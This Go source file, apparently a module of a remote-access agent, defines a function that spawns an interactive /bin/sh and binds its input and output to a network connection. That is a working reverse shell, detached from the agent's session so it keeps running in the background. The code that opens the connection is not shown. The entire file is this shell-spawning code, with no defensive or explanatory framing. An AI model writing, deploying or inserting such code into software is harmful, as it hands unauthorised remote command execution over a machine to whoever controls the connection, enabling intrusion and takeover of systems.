//go:build !windows
// +build !windows

package main

import (
	"net"
	"os"
	"os/exec"
	"syscall"
)

// spawnReverseShell starts /bin/sh -i with stdio bound to rsock.
// Runs in a background goroutine started by handleReverseShell.
func spawnReverseShell(rsock net.Conn) error {
	cmd := exec.Command("/bin/sh", "-i")

	// Detach from the agent's session/tty so it can't stall the client.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	// Adds a friendly TERM; optional but helps prompts.
	cmd.Env = append(os.Environ(), "TERM=xterm")

	cmd.Stdin = rsock
	cmd.Stdout = rsock
	cmd.Stderr = rsock

	// Run blocks this goroutine only; client loop remains responsive.
	return cmd.Run()
}
